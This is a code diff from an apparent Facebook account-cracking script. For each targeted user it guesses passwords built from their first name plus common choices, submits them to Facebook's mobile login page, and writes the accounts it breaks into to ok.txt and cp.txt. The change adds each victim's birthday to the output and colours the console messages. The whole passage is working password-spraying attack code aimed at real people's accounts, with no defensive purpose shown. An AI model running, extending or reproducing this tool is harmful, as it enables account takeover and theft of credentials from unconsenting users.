@@ -430,26 +430,27 @@ def crack1_mbasic(user):
 		a = s.get(api.format('%s?access_token=%s' % (user, toket)), headers=hea).json()
 		dp = a['first_name'].lower()
 		bk = a['last_name'].lower()
-		for pw in [dp,dp+'123',dp+'12345','sayang','bismillah','123456','anjing']:
+		tl = a['birthday']
+		for pw in [dp+'123',dp+'12345','sayang','bismillah','123456','anjing']:
 			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'})
 			xo = rex.content
 			if 'mbasic_logout_button' in xo or 'save-device' in xo:
-				print '\r   [OK] ' +user+ ' | ' +pw+ '                    '
-				Successful.append(user+' | '+pw)
+				print '\r\x1b[0;32m   [OK] ' +user+ ' | ' +pw+ ' | ' +tl+ '                    '
+				Successful.append(user+' | '+pw+' | '+tl)
 				save = open('ok.txt','a')
 				save.write(str(user)+' | '+str(pw)+'\n')
 				save.close()
 				break
 			elif 'checkpoint' in xo:
-				print '\r   [CP] ' +user+ ' | ' +pw+ '                    '
-				Checkpoint.append(user+' | '+pw)
+				print '\r\x1b[0;33m   [CP] ' +user+ ' | ' +pw+ ' | ' +tl+ '                    '
+				Checkpoint.append(user+' | '+pw+' | '+tl)
 				save = open('cp.txt','a')
 				save.write(str(user)+' | '+str(pw)+'\n')
 				save.close()
 				break
 				
 		loop += 1
-                print "\r   [Crack] %s/%s - ok-:%s - cp-:%s "%(loop,len(target),len(Successful),len(Checkpoint)),;sys.stdout.flush()
+                print "\r\x1b[0;37m   [Crack] %s/%s - ok-:%s - cp-:%s "%(loop,len(target),len(Successful),len(Checkpoint)),;sys.stdout.flush()
         except:
                 pass
 
